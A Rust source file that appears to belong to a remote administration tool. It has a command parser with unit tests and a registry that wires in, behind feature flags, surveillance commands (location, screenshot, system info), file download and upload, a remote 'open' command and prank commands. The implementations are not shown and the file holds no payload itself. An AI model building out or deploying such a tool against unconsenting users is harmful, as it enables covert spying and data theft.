use std::collections::HashMap;

pub struct Text {
    pub data: String,
}
pub struct Media {
    pub name: String,
    pub data: String, // Base64 encoded data only
}
pub enum Output {
    Text(Text),
    Media(Media),
}

pub type Args = Vec<String>;
pub type OutFun = fn(Output);
pub type CmdFun = fn(Args, OutFun);

pub struct Command {
    pub name: String,
    pub args: Vec<String>,
}
impl Command {
    pub fn new(string: &String) -> Result<Command, String> {
        let mut args = Vec::new();
        let mut current_arg = String::new();
        let mut inside_quotes = false;

        for c in string.chars() {
            match c {
                ' ' if !inside_quotes => {
                    if !current_arg.is_empty() {
                        args.push(current_arg.clone());
                        current_arg.clear();
                    }
                }
                '\"' => {
                    inside_quotes = !inside_quotes;
                }
                _ => {
                    current_arg.push(c);
                }
            }
        }

        if !current_arg.is_empty() {
            args.push(current_arg);
        }

        if inside_quotes {
            return Err(String::from("Unclosed quote"));
        }

        if args.is_empty() {
            return Err(String::from("No command provided"));
        }

        // Remove the last two characters if they are "\r\n"
        if let Some(last_arg) = args.last_mut() {
            if last_arg.ends_with("\r\n") {
                last_arg.pop();
                last_arg.pop();
            }
        }

        let name = args[0].clone();
        args.remove(0);

        Ok(Command { name, args })
    }
}

pub struct Registry {
    pub fields: HashMap<String, CmdFun>,
    pub out: OutFun,
}
impl Registry {
    pub fn new(out: OutFun) -> Registry {
        Self {
            fields: HashMap::new(),
            out: out,
        }
    }
    pub fn enter(&mut self, name: &str, fun: CmdFun) {
        let name = name.to_string();
        self.fields.insert(name, fun);
    }
    pub fn get(&self, name: String) -> Result<CmdFun, String> {
        if let Some(&fun) = self.fields.get(&name) {
            Ok(fun)
        } else {
            Err(format!("No such command: {}", name))
        }
    }
    pub fn exec(&self, name: String, args: Args) {
        let rfun = self.get(name);
        match rfun {
            Ok(fun) => {
                fun(args, self.out);
            }
            Err(err) => {
                let output = Output::Text(Text { data: err.to_string() });
                (self.out)(output);
            }
        }
    }
}

// Registry initializer
pub fn init(out: OutFun) -> Registry {
    use crate::commands::*;

    let mut reg = Registry::new(out);

    reg.enter("ping", ping);
    reg.enter("quit", quit);
    reg.enter("exit", quit);
    #[cfg(feature = "troll")]
    {
        reg.enter("rickroll", rickroll);
        reg.enter("fart", fart);
    }
    #[cfg(feature = "spy")]
    {
        reg.enter("location", location);
        reg.enter("screenshot", screenshot);
        reg.enter("sys", sys);
    }
    #[cfg(feature = "files")]
    {
        reg.enter("download", download);
        reg.enter("upload", upload);
        reg.enter("ls", ls);
    }
    #[cfg(feature = "control")]
    {
        reg.enter("open", opencmd);
    }

    return reg;
}

// Tests for command parser
#[cfg(test)]
mod tests {
    use super::Command;

    #[test]
    fn test_parse_command_normal() {
        let input = String::from("command");
        let result = Command::new(&input).expect("Error parsing command");
        assert_eq!("command", result.name);
    }
    #[test]
    fn test_parse_command_args() {
        let input = String::from("ancmd arg1 arg2");
        let result = Command::new(&input).expect("Error parsing command");
        assert_eq!("ancmd", result.name);
        assert_eq!(vec!["arg1", "arg2"], result.args);
    }
    #[test]
    fn test_parse_command_quoted_args() {
        let input = String::from(r#"an2cmd arg1 arg2 "plus sized arg3""#);
        let result = Command::new(&input).expect("Error parsing command");
        assert_eq!("an2cmd", result.name);
        assert_eq!(vec!["arg1", "arg2", "plus sized arg3"], result.args);
    }
}
